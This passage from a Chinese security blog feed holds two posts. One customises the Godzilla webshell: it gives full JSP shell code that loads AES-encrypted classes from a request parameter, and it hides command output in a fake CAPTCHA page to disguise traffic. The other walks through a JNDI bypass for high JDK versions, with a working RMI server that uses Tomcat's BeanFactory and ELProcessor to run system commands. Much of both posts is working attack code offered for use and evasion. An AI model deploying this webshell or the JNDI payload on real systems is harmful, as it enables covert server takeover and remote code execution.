                      class="" title="image-20250317172555975"
                > 

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public String findStr(byte[] respResult) &#123;</span><br><span class="line">        String htmlString = new String(respResult);</span><br><span class="line">//        return functions.subMiddleStr(htmlString, this.findStrLeft, this.findStrRight);</span><br><span class="line">        // 检查是否包含 &quot;My only love:&quot;</span><br><span class="line">        String prefix = &quot;My only love:&quot;;</span><br><span class="line">        // 如果字符串为空，直接返回 null</span><br><span class="line">        if (htmlString.isEmpty()) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">        // 提取 &quot;My only love:&quot; 之后的内容</span><br><span class="line">        if (htmlString.startsWith(prefix)) &#123;</span><br><span class="line">            return htmlString.substring(prefix.length());</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            throw new IllegalArgumentException(&quot;Input does not start with &#x27;&quot; + prefix + &quot;&#x27;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317172715962.png"
                      class="" title="image-20250317172715962"
                > 

<p>然后我们编译尝试连接，顺便看看数据包</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317172752324.png"
                      class="" title="image-20250317172752324"
                > 

<p>执行whoami命令可以正确收到信息</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317172835215.png"
                      class="" title="image-20250317172835215"
                > 

<p>看看数据包</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317172923918.png"
                      class="" title="image-20250317172923918"
                > 

<p><strong>到此为止二开的一些基础操作步骤就完成了！！！，可以发挥想象力添加些参数以及响应包一些html格式去混淆流量</strong> </p>
<h2 id="响应包为验证码且隐藏参数"><a href="#响应包为验证码且隐藏参数" class="headerlink" title="响应包为验证码且隐藏参数"></a>响应包为验证码且隐藏参数</h2><p>由上面的学习思路可以知道，我们需要修改两个地方。</p>
<ul>
<li>webshell的响应response地方的输出</li>
<li>客户端findstr对response的输出进行提取，提取我们需要的数据，而不是所有返回的html</li>
</ul>
<h3 id="base64GlobalCode-bin-1"><a href="#base64GlobalCode-bin-1" class="headerlink" title="base64GlobalCode.bin"></a>base64GlobalCode.bin</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">String code1;String xc=&quot;3c6e0b8a9c15224a&quot;; String pass=&quot;pass&quot;; String md5=md5(pass+xc); class X extends ClassLoader&#123;public X(ClassLoader z)&#123;super(z);&#125;public Class Q(byte[] cb)&#123;return super.defineClass(cb, 0, cb.length);&#125; &#125;public byte[] x(byte[] s,boolean m)&#123; try&#123;javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(&quot;AES&quot;);c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),&quot;AES&quot;));return c.doFinal(s); &#125;catch (Exception e)&#123;return null; &#125;&#125; public static String md5(String s) &#123;String ret = null;try &#123;java.security.MessageDigest m;m = java.security.MessageDigest.getInstance(&quot;MD5&quot;);m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();&#125; catch (Exception e) &#123;&#125;return ret; &#125; public static String base64Encode(byte[] bs) throws Exception &#123;Class base64;String value = null;try &#123;base64=Class.forName(&quot;java.util.Base64&quot;);Object Encoder = base64.getMethod(&quot;getEncoder&quot;, null).invoke(base64, null);value = (String)Encoder.getClass().getMethod(&quot;encodeToString&quot;, new Class[] &#123; byte[].class &#125;).invoke(Encoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e) &#123;try &#123; base64=Class.forName(&quot;sun.misc.BASE64Encoder&quot;); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod(&quot;encode&quot;, new Class[] &#123; byte[].class &#125;).invoke(Encoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e2) &#123;&#125;&#125;return value; &#125; public static byte[] base64Decode(String bs) throws Exception &#123;Class base64;byte[] value = null;try &#123;base64=Class.forName(&quot;java.util.Base64&quot;);Object decoder = base64.getMethod(&quot;getDecoder&quot;, null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod(&quot;decode&quot;, new Class[] &#123; String.class &#125;).invoke(decoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e) &#123;try &#123; base64=Class.forName(&quot;sun.misc.BASE64Decoder&quot;); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod(&quot;decodeBuffer&quot;, new Class[] &#123; String.class &#125;).invoke(decoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e2) &#123;&#125;&#125;return value; &#125;</span><br></pre></td></tr></table></figure></div>

<p>base64GlobalCode.bin其实只用修改一个地方，因为我们需要在html里面输出我们想要的数值，所以我们需要定一个一个全局变量去存储我们的输出</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250319170245628.png"
                      class="" title="image-20250319170245628"
                > 

<p>就只多添加了一个这个</p>
<h3 id="base64Code-bin-1"><a href="#base64Code-bin-1" class="headerlink" title="base64Code.bin"></a>base64Code.bin</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">    // 获取请求参数并进行Base64解码</span><br><span class="line">    byte[] data = base64Decode(request.getParameter(&quot;pass&quot;));</span><br><span class="line">    data = base64Decode(new String(data));  // 将 byte[] 转换为 String</span><br><span class="line">    data = x(data, false);</span><br><span class="line"></span><br><span class="line">    // 检查session中是否存在&quot;payload&quot;属性</span><br><span class="line">    if (session.getAttribute(&quot;payload&quot;) == null) &#123;</span><br><span class="line">        // 如果不存在，创建一个新的X类实例并存储到session中</span><br><span class="line">        session.setAttribute(&quot;payload&quot;, new X(this.getClass().getClassLoader()).Q(data));</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // 如果存在，执行以下逻辑</span><br><span class="line">        request.setAttribute(&quot;parameters&quot;, data);</span><br><span class="line"></span><br><span class="line">        // 创建一个ByteArrayOutputStream用于存储输出</span><br><span class="line">        java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();</span><br><span class="line"></span><br><span class="line">        // 从session中获取Class对象并创建其实例</span><br><span class="line">        Object f = ((Class) session.getAttribute(&quot;payload&quot;)).newInstance();</span><br><span class="line"></span><br><span class="line">        // 调用equals方法，可能用于触发某些逻辑</span><br><span class="line">        f.equals(arrOut);</span><br><span class="line">        f.equals(pageContext);</span><br><span class="line"></span><br><span class="line">        // 向响应中写入MD5值的前16位</span><br><span class="line">        //response.getWriter().write(md5.substring(0, 16));</span><br><span class="line">        response.setStatus(404);</span><br><span class="line">        // 调用toString方法，可能用于触发某些逻辑</span><br><span class="line">        f.toString();</span><br><span class="line"></span><br><span class="line">        // 对arrOut的内容进行处理并进行Base64编码后写入响应</span><br><span class="line">        //response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));</span><br><span class="line"></span><br><span class="line">        // 写入MD5值的后16位</span><br><span class="line">        //response.getWriter().write(md5.substring(16));</span><br><span class="line">        code1=base64Encode(x(arrOut.toByteArray(), true));</span><br><span class="line">    &#125;</span><br><span class="line">&#125; catch (Exception e) &#123;</span><br><span class="line">    // 捕获异常，但不进行任何处理</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们知道之前我们的输出的数据是这一部份<strong>base64Encode(x(arrOut.toByteArray(), true))</strong> 所以我们可以将这个数据存储到全局变量code1中。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250319170439447.png"
                      class="" title="image-20250319170439447"
                > 

<p>最后在隐藏的数据中输出code1</p>
<h3 id="shell-jsp-1"><a href="#shell-jsp-1" class="headerlink" title="shell.jsp"></a>shell.jsp</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.util.Base64&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.awt.*&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.awt.image.BufferedImage&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;javax.imageio.ImageIO&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.util.Random&quot; %&gt;</span><br><span class="line">&lt;%!&#123;globalCode&#125;%&gt;&lt;%&#123;code&#125;%&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;验证码示例&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    // 创建一个 BufferedImage 对象</span><br><span class="line">    int width = 100;</span><br><span class="line">    int height = 40;</span><br><span class="line">    BufferedImage image = new BufferedImage(width, height, BufferedImage.TYPE_INT_RGB);</span><br><span class="line">    Graphics g = image.getGraphics();</span><br><span class="line"></span><br><span class="line">    // 设置背景颜色</span><br><span class="line">    g.setColor(Color.WHITE);</span><br><span class="line">    g.fillRect(0, 0, width, height);</span><br><span class="line"></span><br><span class="line">    // 设置字体</span><br><span class="line">    Font font = new Font(&quot;Arial&quot;, Font.BOLD, 20);</span><br><span class="line">    g.setFont(font);</span><br><span class="line"></span><br><span class="line">    // 设置验证码内容</span><br><span class="line">    String code = generateRandomCode();</span><br><span class="line">    g.setColor(Color.BLACK);</span><br><span class="line">    g.drawString(code, 10, 30);</span><br><span class="line"></span><br><span class="line">    // 添加干扰线</span><br><span class="line">    g.setColor(Color.GRAY);</span><br><span class="line">    for (int i = 0; i &lt; 5; i++) &#123;</span><br><span class="line">        int x1 = new Random().nextInt(width);</span><br><span class="line">        int y1 = new Random().nextInt(height);</span><br><span class="line">        int x2 = new Random().nextInt(width);</span><br><span class="line">        int y2 = new Random().nextInt(height);</span><br><span class="line">        g.drawLine(x1, y1, x2, y2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 将 BufferedImage 转换为 Base64 字符串</span><br><span class="line">    ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">    ImageIO.write(image, &quot;png&quot;, baos);</span><br><span class="line">    byte[] bytes = baos.toByteArray();</span><br><span class="line">    String base64 = Base64.getEncoder().encodeToString(bytes);</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line">&lt;img src=&quot;data:image/png;base64,&lt;%= base64 %&gt;&quot; alt=&quot;验证码&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;captcha&quot; value=&quot;&lt;%= code1 %&gt;&quot; /&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    // 生成随机验证码</span><br><span class="line">    private String generateRandomCode() &#123;</span><br><span class="line">        String chars = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;;</span><br><span class="line">        StringBuilder code = new StringBuilder();</span><br><span class="line">        Random random = new Random();</span><br><span class="line">        for (int i = 0; i &lt; 4; i++) &#123;</span><br><span class="line">            code.append(chars.charAt(random.nextInt(chars.length())));</span><br><span class="line">        &#125;</span><br><span class="line">        return code.toString();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>我在shell.jsp里面增加了图片验证码的生成代码，然后写一个hidden标签，把要输出的数据隐藏在里面</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250319170759636.png"
                      class="" title="image-20250319170759636"
                > 

<h3 id="JavaAesBase64-RspCaptcha-java"><a href="#JavaAesBase64-RspCaptcha-java" class="headerlink" title="JavaAesBase64_RspCaptcha.java"></a>JavaAesBase64_RspCaptcha.java</h3><p>修改找数据的地方</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250319171656370.png"
                      class="" title="image-20250319171656370"
                > 

<p>可以使用正则去匹配</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public String findStr(byte[] respResult) &#123;</span><br><span class="line">        // 将字节数组转换为字符串</span><br><span class="line">        String htmlString = new String(respResult);</span><br><span class="line"></span><br><span class="line">        // 定义正则表达式，用于匹配 &lt;input type=&quot;hidden&quot;&gt; 标签的 value 属性</span><br><span class="line">        String regex = &quot;&lt;input\\s+type=\&quot;hidden\&quot;\\s+[^&gt;]*value=\&quot;([^\&quot;]*)\&quot;[^&gt;]*&gt;&quot;;</span><br><span class="line">        java.util.regex.Pattern pattern = java.util.regex.Pattern.compile(regex);</span><br><span class="line">        java.util.regex.Matcher matcher = pattern.matcher(htmlString);</span><br><span class="line"></span><br><span class="line">        // 如果找到匹配项，检查 value 属性的值是否为空</span><br><span class="line">        if (matcher.find()) &#123;</span><br><span class="line">            String value = matcher.group(1); // 获取 value 的值</span><br><span class="line">            if (value == null || value.trim().isEmpty()) &#123;</span><br><span class="line">                return null; // 如果 value 为空或仅包含空白字符，返回 null</span><br><span class="line">            &#125;</span><br><span class="line">            return value; // 返回 value 的值</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // 如果没有找到匹配项，返回 null</span><br><span class="line">            return null; // 或者抛出异常：throw new IllegalArgumentException(&quot;No hidden input found&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>就修改了这个地方</p>
<p>测试一下顺便看看数据包</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250319172132536.png"
                      class="" title="image-20250319172132536"
                > 没有显示我们返回的数据

<p>数据隐藏在里面</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250319172315264.png"
                      class="" title="image-20250319172315264"
                > 

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250319172403561.png"
                      class="" title="image-20250319172403561"
                > 

<p>可以正常运行</p>
]]></content>
      <categories>
        <category>工具二次开发</category>
      </categories>
      <tags>
        <tag>工具二次开发</tag>
        <tag>godzilla</tag>
      </tags>
  </entry>
  <entry>
    <title>JNDI高版本绕过</title>
    <url>/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<p>高版本JDK在RMI和LDAP的<code>trustURLCodebase</code>都做了限制，从默认允许远程加载ObjectFactory变成了不允许。RMI是在6u132, 7u122, 8u113版本开始做了限制，LDAP是 11.0.1, 8u191, 7u201, 6u211版本开始做了限制</p>
<h2 id="需要绕过的原因分析"><a href="#需要绕过的原因分析" class="headerlink" title="需要绕过的原因分析"></a>需要绕过的原因分析</h2><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314171223492.png"
                      class="" title="image-20250314171223492"
                > 

<p>前面学习的时候我们发现需要将trustURLCodebase设置为true才可以进行漏洞利用，原因前面的文章有写</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314171552126.png"
                      class="" title="image-20250314171552126"
                > 

<p>但是我们现实环境中我们又不可能插入代码设置trustURLCodebase为true，所以就只能从前面两个判断中进行绕过<br>但是var8又是我们指定的类，所以没办法为null，能操作的地方就在*var8.getFactoryClassLocation()*这个地方了</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="maven配置"><a href="#maven配置" class="headerlink" title="maven配置"></a>maven配置</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;tomcat-dbcp&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;8.5.3&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt; //这个是我们利用的javax.el.ELProcessor这个类在里面</span><br><span class="line">      &lt;artifactId&gt;tomcat-embed-el&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;8.5.3&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;8.5.3&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;tomcat-jasper&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;8.5.3&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>

<p>tomcat的版本是有要求的，因为我们利用了他的forceString属性</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314183149852.png"
                      class="" title="image-20250314183149852"
                > 

<p>所以我们需要低于这些版本</p>
<h3 id="rmi服务端"><a href="#rmi服务端" class="headerlink" title="rmi服务端"></a>rmi服务端</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line">import org.apache.naming.ResourceRef;</span><br><span class="line">import javax.naming.StringRefAddr;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class BeanFactoryRMIServer &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class="line">        ResourceRef resourceRef = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;,</span><br><span class="line">                true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);</span><br><span class="line">        resourceRef.add(new StringRefAddr(&quot;forceString&quot;, &quot;a=eval&quot;));</span><br><span class="line"></span><br><span class="line">        resourceRef.add(new StringRefAddr(&quot;a&quot;, &quot;Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;)&quot;));</span><br><span class="line">//        resourceRef.add(new StringRefAddr(&quot;a&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;cmd&#x27;,&#x27;/c&#x27;,&#x27;calc&#x27;]).start()\&quot;)&quot;));</span><br><span class="line"></span><br><span class="line">        ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);</span><br><span class="line">        registry.bind(&quot;el&quot;, referenceWrapper);</span><br><span class="line">        System.out.println(&quot;rmi://127.0.0.1:1099/el&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>windows下那个exec里面的命令好像需要改一下，根据自身条件判断，我的是macos，windows改成calc即可</p>
<h3 id="尝试连接的客户端"><a href="#尝试连接的客户端" class="headerlink" title="尝试连接的客户端"></a>尝试连接的客户端</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.naming.ResourceRef;</span><br><span class="line">import org.mvel2.sh.ShellSession;</span><br><span class="line"></span><br><span class="line">import javax.naming.InitialContext;</span><br><span class="line">import javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args) throws NamingException &#123;</span><br><span class="line">        Object lookup = new InitialContext().lookup(&quot;rmi://127.0.0.1:1099/el&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="绕过用的类分析"><a href="#绕过用的类分析" class="headerlink" title="绕过用的类分析"></a>绕过用的类分析</h2><p>我们使用了ResourceRef对象</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314173241334.png"
                      class="" title="image-20250314173241334"
                > 

<p>参考浅蓝师傅的文章</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314172459283.png"
                      class="" title="image-20250314172459283"
                > 
<p>参考这个师傅的文章的图<a class="link"   href="https://www.cnblogs.com/EddieMurphy-blogs/p/18078943" >https://www.cnblogs.com/EddieMurphy-blogs/p/18078943<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> </p>
<h3 id="ResourceRef"><a href="#ResourceRef" class="headerlink" title="ResourceRef"></a>ResourceRef</h3><p><strong>初步分析，这里看不懂很正常，我就举一下这里用到的两个类的关键的地方</strong></p>
<p>看着我的步骤把后续的JNDI完整的链子跟完就知道这些关键点的用处了</p>
<p>这个类的构造有三个关键的地方</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314185156624.png"
                      class="" title="image-20250314185156624"
                > 

<h4 id="factoryLocation为null"><a href="#factoryLocation为null" class="headerlink" title="factoryLocation为null"></a>factoryLocation为null</h4><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314185354274.png"
                      class="" title="image-20250314185354274"
                > 

<p>获取了我们构造的ResourceRef对象，然后获取它的<strong>factoryLocation</strong> ，如果为null，那就绕过，执行else里面的return 后面的方法</p>
<h4 id="factory为BeanFactory"><a href="#factory为BeanFactory" class="headerlink" title="factory为BeanFactory"></a>factory为BeanFactory</h4><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314185709179.png"
                      class="" title="image-20250314185709179"
                > 

<p>从我们构造的ResourceRef中获取factoryClass，提取出了BeanFactory</p>
<h4 id="resourceClass为漏洞利用的类"><a href="#resourceClass为漏洞利用的类" class="headerlink" title="resourceClass为漏洞利用的类"></a>resourceClass为漏洞利用的类</h4><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314185820880.png"
                      class="" title="image-20250314185820880"
                > 

<p>factory为org.apache.naming.factory.BeanFactory，所以调用它的getObjectInstance方法</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314185922046.png"
                      class="" title="image-20250314185922046"
                > 

<p>这里他获取了ref就是我们的ResourceRef对象的class的name，就是我们resourceClass设置的<strong>javax.el.ELProcessor</strong> ，然后后续就是将这个<strong>javax.el.ELProcessor</strong> 给实例化然后利用反射去调用eval方法实现命令执行。</p>
<h3 id="org-apache-naming-factory-BeanFactory"><a href="#org-apache-naming-factory-BeanFactory" class="headerlink" title="org.apache.naming.factory.BeanFactory"></a>org.apache.naming.factory.BeanFactory</h3><p>这个类我们先不看太多，流程跟着后面完整分析走就可以懂，就看一个关键的点。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314190224659.png"
                      class="" title="image-20250314190224659"
                > 

<p>获取了我们所需要用到的<strong>javax.el.ELProcessor</strong> 的类名</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314190250894.png"
                      class="" title="image-20250314190250894"
                > 

<p>把我们的类给实例化了存在bean参数里面</p>
<p><strong>中间有一段获取方法以及参数的过程</strong> 流程后面有写</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314190342664.png"
                      class="" title="image-20250314190342664"
                > 

<p>反射调用命令执行。</p>
<h2 id="JNDI绕过完整分析"><a href="#JNDI绕过完整分析" class="headerlink" title="JNDI绕过完整分析"></a>JNDI绕过完整分析</h2><p>看一下payload对应的参数</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314173431977.png"
                      class="" title="image-20250314173431977"
                > 

<p>可以观察到factoryLocation这个参数被设置为了null，就是为了绕过我们的JNDI的那个if判断</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314173927228.png"
                      class="" title="image-20250314173927228"
                > 
<p>然后还有forceString进行构造，我们可以打上断点进行跟踪</p>
<h3 id="漏洞触发点分析"><a href="#漏洞触发点分析" class="headerlink" title="漏洞触发点分析"></a>漏洞触发点分析</h3><p>接下来分析的是，lookup()链子走的时候是怎么绕过前面说的trustURLCodebase的限制，以及怎么触发的实例化getObjectInstance方法。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314183733704.png"
                      class="" title="image-20250314183733704"
                > 

<p>进入deocdeObject</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314183818414.png"
                      class="" title="image-20250314183818414"
                > 

<p>提前看一下被限制的地方我们打上断点</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314183851246.png"
                      class="" title="image-20250314183851246"
                > 

<p>然后我们一步一步走</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314183930238.png"
                      class="" title="image-20250314183930238"
                > 

<p>var3是ResourceRef对象，且后续将它赋值给了var8</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314184007058.png"
                      class="" title="image-20250314184007058"
                > 

<p>然后进入判断的地方</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314184020438.png"
                      class="" title="image-20250314184020438"
                > 

<p>这里我们前面的payload设置为null的，所以可以绕过</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314184052474.png"
                      class="" title="image-20250314184052474"
